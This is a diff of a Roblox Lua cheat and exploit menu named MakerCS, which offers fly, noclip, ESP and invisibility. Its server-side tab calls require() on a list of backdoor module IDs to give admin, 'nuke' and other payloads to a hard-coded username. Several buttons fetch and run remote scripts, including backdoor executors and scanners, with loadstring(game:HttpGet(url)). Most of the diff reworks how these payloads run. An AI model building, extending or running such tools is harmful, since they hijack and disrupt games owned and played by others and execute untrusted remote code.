@@ -4,7 +4,6 @@ local UIS = game:GetService("UserInputService")
 local RS = game:GetService("RunService")
 local Lighting = game:GetService("Lighting")
 local SG = game:GetService("StarterGui")
-local HttpService = game:GetService("HttpService")
 
 local plr = Players.LocalPlayer
 local char, hum, root
@@ -20,7 +19,6 @@ local function getCharacter()
     return true
 end
 
--- Wait for character initially
 getCharacter()
 
 local flying, noclipping, espOn, discoOn, invisible = false, false, false, false, false
@@ -30,52 +28,12 @@ local esps = {}
 
 -- Check if game is backdoored
 local function isGameBackdoored()
-    local backdoorIndicators = {
-        "require(7192763922)",
-        "require(0x7435b09c4",
-        "require(7116428237)",
-        "require(5813836873)",
-        "require(100263845596551)",
-        "require(5282751219)",
-        "require(113113746583514)",
-        "require(4867426485)",
-        "require(7001260635)",
-        "require(15581949972)",
-        "require(9230060018)",
-        "require(7411835387)",
-        "require(8222129769)",
-        "require(11505758587)",
-        "require(16857604287)",
-        "require(114451231828363)",
-        "require(0x4047FE746)",
-        "require(16316592650)",
-        "require(6016746796)",
-        "require(5436326937)"
-    }
-    
-    for _, indicator in pairs(backdoorIndicators) do
-        local success, result = pcall(function()
-            return loadstring(indicator)
-        end)
-        if success then
-            return true
-        end
-    end
-    return false
+    local success, result = pcall(function()
+        return require(7192763922)
+    end)
+    return success
 end
 
--- Kick if not backdoored (for serverside scripts)
-local function kickIfNotBackdoored()
-    if not isGameBackdoored() then
-        notify("This game is NOT backdoored!\nServerside scripts will not work.\nKicking in 3 seconds...")
-        task.wait(3)
-        plr:Kick("MakerCS - This game is not backdoored. Serverside scripts require a backdoored game.")
-    else
-        notify("Backdoored game detected! Serverside scripts available.")
-    end
-end
-
--- Update character on respawn
 plr.CharacterAdded:Connect(function(newChar)
     char = newChar
     hum = char:WaitForChild("Humanoid")
@@ -206,7 +164,7 @@ local mainContent = Instance.new("ScrollingFrame")
 mainContent.Size = UDim2.new(1,0,1,-130)
 mainContent.Position = UDim2.new(0,0,0,100)
 mainContent.BackgroundTransparency = 1
-mainContent.CanvasSize = UDim2.new(0,0,0,350)
+mainContent.CanvasSize = UDim2.new(0,0,0,0)
 mainContent.ScrollBarThickness = 8
 mainContent.Parent = mainFrame
 
@@ -215,7 +173,7 @@ scriptsContent.Size = UDim2.new(1,0,1,-130)
 scriptsContent.Position = UDim2.new(0,0,0,100)
 scriptsContent.BackgroundTransparency = 1
 scriptsContent.Visible = false
-scriptsContent.CanvasSize = UDim2.new(0,0,0,400)
+scriptsContent.CanvasSize = UDim2.new(0,0,0,0)
 scriptsContent.ScrollBarThickness = 8
 scriptsContent.Parent = mainFrame
 
@@ -224,9 +182,25 @@ ssContent.Size = UDim2.new(1,0,1,-130)
 ssContent.Position = UDim2.new(0,0,0,100)
 ssContent.BackgroundTransparency = 1
 ssContent.Visible = false
-ssContent.CanvasSize = UDim2.new(0,0,0,1200)
+ssContent.CanvasSize = UDim2.new(0,0,0,0)
 ssContent.ScrollBarThickness = 8
 ssContent.Parent = mainFrame
+
+-- UIListLayout for each content frame
+local mainLayout = Instance.new("UIListLayout")
+mainLayout.Parent = mainContent
+mainLayout.Padding = UDim.new(0, 10)
+mainLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+local scriptsLayout = Instance.new("UIListLayout")
+scriptsLayout.Parent = scriptsContent
+scriptsLayout.Padding = UDim.new(0, 10)
+scriptsLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+local ssLayout = Instance.new("UIListLayout")
+ssLayout.Parent = ssContent
+ssLayout.Padding = UDim.new(0, 10)
+ssLayout.SortOrder = Enum.SortOrder.LayoutOrder
 
 local function notify(txt)
     pcall(function()
@@ -272,32 +246,8 @@ local function makeScriptButton(parent, text, url, order)
         notify("Loading " .. text .. "...")
         pcall(function()
             loadstring(game:HttpGet(url))()
-            notify(text .. " Loaded!")
         end)
-    end)
-    return btn
-end
-
-local function makeServerScriptButton(parent, text, script, order)
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(0.9,0,0,50)
-    btn.BackgroundColor3 = Color3.fromRGB(70,50,50)
-    btn.Text = text
-    btn.TextColor3 = Color3.new(1,1,1)
-    btn.TextScaled = true
-    btn.Font = Enum.Font.GothamSemibold
-    btn.LayoutOrder = order
-    btn.Parent = parent
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,8)
-
-    btn.MouseButton1Click:Connect(function()
-        if not isGameBackdoored() then
-            notify("⚠️ This game is NOT backdoored! Server-side script may not work!")
-        end
-        notify("Executing: " .. text)
-        pcall(function()
-            loadstring(script)()
-        end)
+        notify(text .. " Loaded!")
     end)
     return btn
 end
@@ -479,36 +429,29 @@ checkBtn.MouseButton1Click:Connect(function()
     end
 end)
 
--- Server-side scripts with YOUR username "ThatOneScripter1234"
+-- Server-side scripts (DIRECT EXECUTION, not loadstring)
 local ssScripts = {
-    {"HD Admin Giver", [[require(7192763922).load("ThatOneScripter1234")]]},
-    {"OP GUI Sigma", [[require(0x7435b09c4+0x38501a58+0x5a59*-0xa0396):opss144anz("ThatOneScripter1234")]]},
-    {"OP GUI ES", [[require(7116428237).SBV4("ThatOneScripter1234")]]},
-    {"R6 Archangel of Light", [[require(5813836873).load("ThatOneScripter1234")]]},
-    {"OP GUI Sensation SS", [[require(100263845596551)("ThatOneScripter1234", ColorSequence.new(Color3.fromRGB(71, 148, 253), Color3.fromRGB(71, 253, 160)), "Standard")]]},
-    {"OP Earthy Hub", [[require(5282751219):Fire("ThatOneScripter1234")]]},
-    {"Nuke", [[require(113113746583514).nuke("ThatOneScripter1234")]]},
-    {"Timed Nuke V2", [[require(4867426485):SD2("ThatOneScripter1234")]]},
-    {"Timed Nuke V1", [[require(4867426485):SD("ThatOneScripter1234")]]},
-    {"LC Tools Reuploaded", [[require(7001260635).lctoolsreuploaded("ThatOneScripter1234")]]},
-    {"Minecraft Building", [[require(15581949972).mc("ThatOneScripter1234")]]},
-    {"Helicopter", [[require(9230060018).RAroblox("ThatOneScripter1234")]]},
-    {"Time Machine", [[require(7411835387)("ThatOneScripter1234")]]},
-    {"You Are An Idiot", [[require(8222129769).youareanidiot("ThatOneScripter1234")]]},
-    {"Drill Destroyer", [[require(11505758587).RAroblox("ThatOneScripter1234")]]},
-    {"Excavator", [[require(16857604287)("ThatOneScripter1234")]]},
-    {"Cybertruck", [[require(114451231828363).TeslaCybertruck("ThatOneScripter1234")]]},
-    {"Team Fat GUI V25", [[require(0x4047FE746).C00PER("ThatOneScripter1234") -- Password: TeamFatWasHere]]},
-    {"Chicken Script", [[require(16316592650).chickensaretastyandverymuchyummybut12345djsfnsdifjbiBHDFBEFIHEZBFIUESH0("ThatOneScripter1234")]]},
-    {"Dev Console", [[require(6016746796):Console("ThatOneScripter1234")]]},
-    {"Adonis Ranker", [[require(5436326937)("ThatOneScripter1234")]]}
-}
-
--- Loadstring server-side scripts
-local ssLoadstringScripts = {
-    {"Sky Hub Backdoor", "https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/FE/BackDoor/tntmasterss.txt"},
-    {"LALOL Hub Backdoor Scanner", "https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script"},
-    {"Backdoor Executor (Kicks if not backdoored)", "https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"}
+    {"HD Admin Giver", function() pcall(function() require(7192763922).load("ThatOneScripter1234") end) end},
+    {"OP GUI Sigma", function() pcall(function() require(0x7435b09c4+0x38501a58+0x5a59*-0xa0396):opss144anz("ThatOneScripter1234") end) end},
+    {"OP GUI ES", function() pcall(function() require(7116428237).SBV4("ThatOneScripter1234") end) end},
+    {"R6 Archangel of Light", function() pcall(function() require(5813836873).load("ThatOneScripter1234") end) end},
+    {"OP GUI Sensation SS", function() pcall(function() require(100263845596551)("ThatOneScripter1234", ColorSequence.new(Color3.fromRGB(71, 148, 253), Color3.fromRGB(71, 253, 160)), "Standard") end) end},
+    {"OP Earthy Hub", function() pcall(function() require(5282751219):Fire("ThatOneScripter1234") end) end},
+    {"Nuke", function() pcall(function() require(113113746583514).nuke("ThatOneScripter1234") end) end},
+    {"Timed Nuke V2", function() pcall(function() require(4867426485):SD2("ThatOneScripter1234") end) end},
+    {"Timed Nuke V1", function() pcall(function() require(4867426485):SD("ThatOneScripter1234") end) end},
+    {"LC Tools Reuploaded", function() pcall(function() require(7001260635).lctoolsreuploaded("ThatOneScripter1234") end) end},
+    {"Minecraft Building", function() pcall(function() require(15581949972).mc("ThatOneScripter1234") end) end},
+    {"Helicopter", function() pcall(function() require(9230060018).RAroblox("ThatOneScripter1234") end) end},
+    {"Time Machine", function() pcall(function() require(7411835387)("ThatOneScripter1234") end) end},
+    {"You Are An Idiot", function() pcall(function() require(8222129769).youareanidiot("ThatOneScripter1234") end) end},
+    {"Drill Destroyer", function() pcall(function() require(11505758587).RAroblox("ThatOneScripter1234") end) end},
+    {"Excavator", function() pcall(function() require(16857604287)("ThatOneScripter1234") end) end},
+    {"Cybertruck", function() pcall(function() require(114451231828363).TeslaCybertruck("ThatOneScripter1234") end) end},
+    {"Team Fat GUI V25", function() pcall(function() require(0x4047FE746).C00PER("ThatOneScripter1234") end) end},
+    {"Chicken Script", function() pcall(function() require(16316592650).chickensaretastyandverymuchyummybut12345djsfnsdifjbiBHDFBEFIHEZBFIUESH0("ThatOneScripter1234") end) end},
+    {"Dev Console", function() pcall(function() require(6016746796):Console("ThatOneScripter1234") end) end},
+    {"Adonis Ranker", function() pcall(function() require(5436326937)("ThatOneScripter1234") end) end}
 }
 
 local order = 1
@@ -524,18 +467,23 @@ for _, scriptData in pairs(ssScripts) do
     btn.Parent = ssContent
     Instance.new("UICorner", btn).CornerRadius = UDim.new(0,8)
     
-    local scriptCode = scriptData[2]
+    local func = scriptData[2]
     btn.MouseButton1Click:Connect(function()
         if not isGameBackdoored() then
             notify("⚠️ This game may not be backdoored! This script may not work!")
         end
-        notify("Executing: " .. scriptData[1] .. " for user: " .. USERNAME)
-        pcall(function()
-            loadstring(scriptCode)()
-        end)
+        notify("Executing: " .. scriptData[1])
+        pcall(func)
     end)
     order = order + 1
 end
+
+-- Loadstring server-side scripts
+local ssLoadstringScripts = {
+    {"Sky Hub Backdoor", "https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/FE/BackDoor/tntmasterss.txt"},
+    {"LALOL Hub Backdoor Scanner", "https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script"},
+    {"Backdoor Executor (Kicks if not backdoored)", "https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"}
+}
 
 for _, scriptData in pairs(ssLoadstringScripts) do
     local btn = Instance.new("TextButton")
@@ -562,6 +510,23 @@ for _, scriptData in pairs(ssLoadstringScripts) do
     order = order + 1
 end
 
+-- Update canvas sizes
+local function updateCanvasSize(frame)
+    local count = 0
+    for _, child in ipairs(frame:GetChildren()) do
+        if child:IsA("TextButton") then
+            count = count + 1
+        end
+    end
+    local totalHeight = (count * 60) + 20
+    frame.CanvasSize = UDim2.new(0, 0, 0, totalHeight)
+end
+
+task.wait(0.1)
+updateCanvasSize(mainContent)
+updateCanvasSize(scriptsContent)
+updateCanvasSize(ssContent)
+
 -- Tab Switching
 mainTabBtn.MouseButton1Click:Connect(function()
     mainContent.Visible = true
@@ -570,6 +535,7 @@ mainTabBtn.MouseButton1Click:Connect(function()
     mainTabBtn.BackgroundColor3 = Color3.fromRGB(0,120,255)
     scriptsTabBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
     ssTabBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
+    updateCanvasSize(mainContent)
 end)
 
 scriptsTabBtn.MouseButton1Click:Connect(function()
@@ -579,6 +545,7 @@ scriptsTabBtn.MouseButton1Click:Connect(function()
     scriptsTabBtn.BackgroundColor3 = Color3.fromRGB(0,120,255)
     mainTabBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
     ssTabBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
+    updateCanvasSize(scriptsContent)
 end)
 
 ssTabBtn.MouseButton1Click:Connect(function()
@@ -588,6 +555,7 @@ ssTabBtn.MouseButton1Click:Connect(function()
     ssTabBtn.BackgroundColor3 = Color3.fromRGB(0,120,255)
     mainTabBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
     scriptsTabBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
+    updateCanvasSize(ssContent)
 end)
 
 -- Minimize / Icon
@@ -601,4 +569,4 @@ icon.MouseButton1Click:Connect(function()
     icon.Visible = false
 end)
 
-notify("MakerCS Loaded! User: " .. USERNAME .. " | Features: Fly, Noclip, ESP, Disco, Invisible + Scripts + ServerSide")
+notify("MakerCS Loaded! User: " .. USERNAME)
